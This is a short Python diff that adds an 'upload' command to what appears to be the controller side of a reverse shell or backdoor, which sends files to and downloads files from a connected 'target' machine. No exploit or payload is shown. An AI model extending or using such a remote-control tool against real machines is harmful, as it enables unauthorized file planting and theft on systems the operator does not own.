@@ -18,6 +18,11 @@ def receiver():
             continue
 
 
+def upload_file(file_name):
+    with open(file_name, "rb") as f:
+        target.send(f.read())
+
+
 def download_file(file_name):
     with open(file_name, "wb") as f:
         target.settimeout(1)
@@ -43,6 +48,8 @@ def target_communication():
             pass
         elif command[:8] == "download":
             download_file(command[9:])
+        elif command[:6] == "upload":
+            upload_file(command[7:])
         else:
             result = receiver()
             print(result)
